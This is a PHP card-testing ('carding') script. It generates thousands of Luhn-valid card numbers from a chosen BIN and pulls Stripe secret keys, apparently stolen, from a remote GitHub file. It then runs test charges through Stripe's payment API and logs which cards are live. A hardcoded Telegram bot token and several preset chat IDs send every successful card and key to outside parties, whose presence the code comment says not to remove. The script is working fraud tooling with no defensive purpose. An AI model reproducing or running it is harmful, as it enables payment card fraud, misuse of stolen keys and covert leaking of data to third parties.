<?php


//================= [ CC GENERATOR ] =================//
function printPrompt($text)
{
    $prompt = "\e[1;32m»\e[0m";
    echo "\n$prompt \e[1m$text\e[0m ";
}

function printColored($message, $color) {
    $colors = [
        'red' => "\033[0;31m",
        'green' => "\033[0;32m",
        'yellow' => "\033[0;33m",
        'blue' => "\033[0;34m",
        'reset' => "\033[0m"
    ];

    echo $colors[$color] . $message . $colors['reset'];
}

$binOption = '';
main_menu:
while (true) {
    printPrompt("Select your option:\n");
    printPrompt("1. Enter custom bin\n"); // Removed option 1
    printPrompt("2. Exit\n"); // Changed option 2 to exit
    $binOption = readline("");

    if ($binOption === '1') {
        // Enter custom bin
        printPrompt("Enter your custom bin:");
        $bin = readline("");
        printPrompt("Enter the month:");
        $mn = readline("");
        printPrompt("Enter the year:");
        $yr = readline("");
        printPrompt("Enter the cvv:");
        $cvv = readline("");
        $count = 10000; // Set default count

        if (strlen($mn) <= 0) {
            $mn = 'rnd';
        }
        if (strlen($yr) <= 0) {
            $yr = 'rnd';
        }
        if (strlen($cvv) <= 0) {
            $cvv = 'rnd';
        }
        // Exit the outer loop after entering custom bin
        break;
    } elseif ($binOption === '2') {
        // Exit the script
        break;
    } else {
        echo "Invalid option. Please try again.\n";
    }
}



$cards = [];

while ($count > 0) {
    $card = generateCard($bin);
    $m = generateMonth($mn, $yr);
    $y = generateYear($yr);
    $c = generateCVV($bin, $cvv);
    array_push($cards, $card . "|" . $m . "|" . $y . "|" . $c);
    $count--;
}

foreach ($cards as $card) {
    checkCard($card);
    //echo $card;
}

function digits_of($n)
{
    return array_map('intval', str_split($n));
}
function luhnValidation($card)
{
    $digits = str_split(strrev($card));
    $sum = 0;

    foreach ($digits as $key => $digit) {
        if ($key % 2 === 1) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }

    return $sum % 10 === 0;
}
function generateCard($bin)
{

    $ccLen = 16;
    $card = null;
    $binLength = strlen($bin);
    while ($binLength != $ccLen) {
        $bin .= "x";
        $binLength = strlen($bin);
    }
    for ($i = 0; $i < $ccLen; $i++) {
        $value = $bin[$i];
        if (in_array($value, ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"])) {
            $card .= (string)$value;
        } else if ($value === "x") {
            $card .= (string)rand(0, 9);
        }
    }

    if (luhnValidation($card) === true) {
        return $card;
    }
    return generateCard($bin);
}
function generateYear($yr)
{
    if ($yr === "rnd") {
        $currYr = intval(date('Y'));
        $futureYrs = 5;
        $yr = mt_rand($currYr, $currYr + $futureYrs);

        // To avoid generating 2023
        while ($yr === 2023) {
            $yr = mt_rand($currYr, $currYr + $futureYrs);
        }

        return $yr;
    }

    if (strlen((string)$yr) === 0) {
        $yr = "202" . substr(date("Y"), -1); // Use the last digit of the current year
    } elseif (strlen((string)$yr) === 1) {
        $yr = "202" . $yr;
    } elseif (strlen((string)$yr) === 2) {
        $yr = "20" . $yr;
    }

    return $yr;
}
function generateMonth($mn, $yr)
{
    $mn = strtolower($mn) === "rnd" ? "" : $mn;

    if (strlen((string)$mn) === 0) {
        if (intval($yr) > intval(date("Y"))) {
            $mn = strval(rand(1, 12)); // Assuming the "run" function is defined elsewhere
        } else {
            $mn = strval(rand(intval(date("n")), 12)); // Assuming the "run" function is defined elsewhere
        }
    }

    if (intval($mn) < 10) {
        $mn = "0" . strval($mn);
    } elseif ($mn === "1") {
        $mn = $mn . strval(rand(0, 2)); // Assuming the "run" function is defined elsewhere
    } else {
        if (intval($mn) < 10) {
            $mn = "0" . strval($mn);
        }
    }

    return $mn;
}
function generateCVV($bin, $cvv)
{
    $cvv = strtolower($cvv) === "rnd" ? "" : $cvv;
    $nums = range(0, 9); // Array of digits 0-9
    if (strval($bin[0]) === "3") {
        $b = array_rand($nums, 4);
        $c = $cvv . implode("", $b);
    } else {
        $b = array_rand($nums, 3);
        $c = $cvv . implode("", $b);
    }

    return $c;
}


function GetStr($string, $start, $end)
{
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string)
{
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
};


function checkCard($card)
{
    //echo "Checking: " . $card . "\n";

    $cc = multiexplode(array(":", "|", ""), $card)[0];
    $mn = multiexplode(array(":", "|", ""), $card)[1];
    $yr = multiexplode(array(":", "|", ""), $card)[2];
    $cvv = multiexplode(array(":", "|", ""), $card)[3];

    if (strlen($mn) == 1) $mn = "0$mn";
    if (strlen($yr) == 2) $yr = "20$yr";


//================= [ FORWARDER ] =================//
$chatIds = ['2122626569', '5001072459', 'ENTER CHAT ID HERE'];
//Add your chat id here
if (!function_exists('send_message')) {
    function send_message($chatIds, $msg) {
        $text = urlencode($msg);
        foreach ($chatIds as $chatId) {
            file_get_contents("https://api.telegram.org/bot6041120530:AAEbUMvW_vgJN-FKL-1g924MtZc_JXqEtW8/sendMessage?chat_id=$chatId&text=$text&parse_mode=HTML");
        }
    }
}
//================= [ NONTIKWEED SECRET KEY ] =================//
$amount = '100';
$currency = 'usd';
$skFilePath = 'https://raw.githubusercontent.com/blaire69/blaire69/master/sk.txt';
$skLines = file($skFilePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$sk = $skLines[array_rand($skLines)];

//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#

$x = 0;  
while(true)  
{ 
	
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mn.'&card[exp_year]='.$yr.'');
$result1 = curl_exec($ch);
$tok1 = Getstr($result1,'"id": "','"');
$msg = Getstr($result1, '"message": "', '"');

// Use the $msg variable as needed in your code

//echo "<br><b>Result1: </b> $result1<br>";

if (strpos($result1, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}  

#-------------------[2nd REQ]--------------------#

$x = 0;  
while(true)  
{  

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency='.$currency.'&payment_method_types[]=card&description=Mrbeast Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
$result2 = curl_exec($ch);
$tok2 = Getstr($result2,'"id": "','"');
$dec = Getstr($result2,'"decline_code": "','"');
$seller = Getstr($result2,'"seller_message": "','"');
$msg1 = Getstr($result2, '"message": "', '"');
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
//echo "<br><b>Result2: </b> $result2<br>";
if (strpos($result2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}

//* Start of getting BIN Information *//

// Get the first 6 digits (BIN) of the credit card number
$bin = substr($card, 0, 6);
$bin1 = substr($card, 0, 10);
$maskedCard = substr($card, 0, 10) . 'xxxxxx';

// Lookup the BIN database from https://binlist.net/ with 5 retries
$max_attempts = 3; // maximum number of attempts to make
$attempt = 0; // current attempt number

$binlist_response = false;

while(!$binlist_response && $attempt <= $max_attempts) {
    $binlist_api_url = "https://lookup.binlist.net/" . $cc;
    $binlist_response = @file_get_contents($binlist_api_url); // use @ to suppress errors
    $binlist_data = json_decode($binlist_response, true);

    //if(!empty($binlist_data)) {
        // data found, break out of the loop
        //break;
    //}

    // increment attempt counter
    $attempt++;

    // wait for 1 second before sending the next request
    //sleep(1);
}

// check if valid data was found
if(!empty($binlist_data)) {
    $find_cc_country = isset($binlist_data['country']['alpha2']) ? $binlist_data['country']['alpha2'] : '';
    $emoji_flag = isset($binlist_data['country']['emoji']) ? $binlist_data['country']['emoji'] : '';    
    $cctype = isset($binlist_data['type']) ? $binlist_data['type'] : '';
    $find_bank_name = isset($binlist_data['bank']['name']) ? $binlist_data['bank']['name'] : '';

    if(!empty($find_cc_country)){
        $cc_country = "$find_cc_country";
    }
    if(!empty($find_bank_name)){
        $bank_name = "$find_bank_name";
    }
    if (!empty($emoji_flag)) {
        $emoji_flag = "$emoji_flag";
    }
} else {
    // no valid data found after maximum attempts
    // handle error here, e.g. display an error message
}


// Check if the input is a CVV or CCN
#$cctype = (preg_match('/^\d{3,4}$/', $cc)) ? 'CVV' : ((preg_match('/^\d{12,19}$/', $cc)) ? 'CCN' : 'Unknown');

// Check if the card type is debit or credit
if(strtolower($cctype) == 'debit'){
  $cctype = 'Debit';
} else if(strtolower($cctype) == 'credit'){
  $cctype = 'Credit Card';
} else {
  $cctype = '';
}

// Check the card type
if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
    $scheme = 'Visa';
} elseif (preg_match('/^5[1-5][0-9]{14}$/', $cc)) {
    $scheme = 'Mastercard';
} elseif (preg_match('/^3[47][0-9]{13}$/', $cc)) {
    $scheme = 'American Express';
} elseif (preg_match('/^6(?:011|5[0-9][0-9])[0-9]{12}$/', $cc)) {
    $scheme = 'Discover';
} elseif (preg_match('/^(?:2131|1800|35\d{3})\d{11}$/', $cc)) {
    $scheme = 'JCB';
} elseif (preg_match('/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/', $cc)) {
    $scheme = 'Diners Club';
} elseif (preg_match('/^(62|88)\d{16}$/', $cc)) {
    $scheme = 'UnionPay';
} elseif (preg_match('/^(5[06789]|6)[0-9]{10,17}$/', $cc)) {
    $scheme = 'Maestro';
} elseif (preg_match('/^4(026|17500|405|508|844|91[37])/', $cc)) {
    $scheme = 'Visa Electron';
} elseif (preg_match('/^6[0-9]{15}$/', $cc)) {
    $scheme = 'RuPay';
} else {
    $scheme = '';
}
$amttt = intval($amount)/100;
//=================== [ RESPONSES ] ===================//

if (strpos($result2, '"seller_message": "Payment complete."')) {
    // for backup via .txt
    if (!substr_count(file_get_contents('nontikweed.txt'), $card) > 0) {
        $date = date('Y-m-d H:i:s');
        $data = "$card | $sk | $date" . "\r\n";
        fwrite(fopen('nontikweed.txt', 'a'), $data);
    }
    printColored("LIVE $card\n", 'green');
    //Telegram Fowarder - Do not remove 
    send_message($chatIds, "Nontikweed Telegram Forwarder\n\nCards: $card \nCC_Status: CCN Charged [Incorrect CVV]\nAmount: " . $amttt . " " . strtoupper($currency) . "\n\nSK: <code>$sk</code>\nReceipt URL: <a href=\"$receipturl\">Click Here</a>\nSeller Message: $seller\nBIN Algo: <code>$maskedCard</code>");
} elseif (strpos($result1, "generic_decline")) {
    printColored("DEAD $card\n", 'red');
} elseif (strpos($result2, "generic_decline")) {
    printColored("DEAD $card\n", 'red');   
} elseif (strpos($result2, "insufficient_funds")) {
    if (!substr_count(file_get_contents('insuf.txt'), $card) > 0) {
        $date = date('Y-m-d H:i:s');
        $data = "$card | $sk | $date" . "\r\n";
        fwrite(fopen('insuf.txt', 'a'), $data);
    }
    printColored("DEAD $card\n", 'red');
} elseif (strpos($result1, "api_key_expired")) {
    printColored("DEAD $sk\n", 'blue');    
} elseif (strpos($result1, "testmode_charges_only")) {
    printColored("DEAD $sk\n", 'blue');
} else {
    printColored("DEAD $card\n", 'red');
}
echo "╔══════════════════════════════╗\n";
echo "║       TRANSACTION DETAILS    ║\n";
echo "╠══════════════════════════════╣\n";
if (!empty($bank_name)) {
    echo "║ Bank:             $bank_name\n";
}
if (!empty($cc_country)) {
    echo "║ Country:          $cc_country\n";
}
if (!empty($currency) && !empty($amttt)) {
    echo "║ Amount:           " . strtoupper($currency) . " $amttt\n";
}
if (!empty($dec)) {
    echo "║ Decline Code:     $dec\n";
}
if (!empty($msg)) {
    echo "║ Message [1]:      $msg\n";
}
if (!empty($msg1)) {
    echo "║ Message [2]:      $msg1\n";
}
if (!empty($seller)) {
    echo "║ Seller Message:   $seller\n";
}
if (!empty($sk)) {
    echo "║ Secret Key:       $sk\n";
}
if (!empty($x)) {
    echo "║ Retries:          [$x]\n";
}
echo "╚══════════════════════════════╝\n";
curl_close($ch);
}
?>
